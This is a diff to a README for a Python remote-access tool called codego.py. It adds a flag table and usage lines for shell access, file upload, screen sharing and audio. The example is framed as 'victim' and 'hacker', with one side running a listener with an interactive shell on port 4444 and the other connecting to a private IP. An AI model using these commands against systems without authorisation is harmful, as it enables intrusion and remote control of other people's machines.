@@ -18,6 +18,7 @@
 - 📂 **File Uploading**
 - 🛠️ **Remote Command Execution**
 - 💻 **Interactive Command Shell**
+- 🧠 **Custom ASCII Art & Themed UI**
 
 ---
 
@@ -29,3 +30,26 @@
 
 ```bash
 pip install -r requirements.txt
+
+python3 codego.py -t <target_ip> -p <port> [options]
+
+
+| Flag | Long Option | Description                                      |
+| ---- | ----------- | ------------------------------------------------ |
+| `-l` | `--listen`  | Listen for incoming connections                  |
+| `-e` | `--execute` | Execute a specified command/file upon connection |
+| `-c` | `--command` | Open interactive shell                           |
+| `-u` | `--upload`  | Upload a file to a destination                   |
+| `-s` | `--stream`  | Start screen sharing session                     |
+| `-a` | `--audio`   | Start voice call session                         |
+| `-t` | `--target`  | Target IP address                                |
+| `-p` | `--port`    | Port number                                      |
+
+
+victim:
+python3 codego.py -l -p 4444 -c
+
+hacker:
+python3 codego.py -t 192.168.1.5 -p 4444
+
+
